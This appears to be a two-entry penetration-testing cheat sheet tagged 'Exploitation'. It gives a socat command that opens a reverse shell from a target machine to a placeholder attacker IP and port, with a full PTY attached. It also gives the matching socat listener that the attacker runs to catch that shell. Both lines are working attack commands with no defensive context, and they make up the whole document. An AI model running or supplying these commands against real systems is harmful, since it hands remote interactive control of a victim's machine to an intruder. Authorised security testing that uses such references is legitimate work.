# [Exploitation] Reverse shell (PTY, robust) --socat
socat TCP:<attacker_ip>:<port> EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

# [Exploitation] TCP listener with PTY (better TTY) --socat
socat -d -d TCP-LISTEN:<port>,reuseaddr,fork FILE:`tty`,raw,echo=0
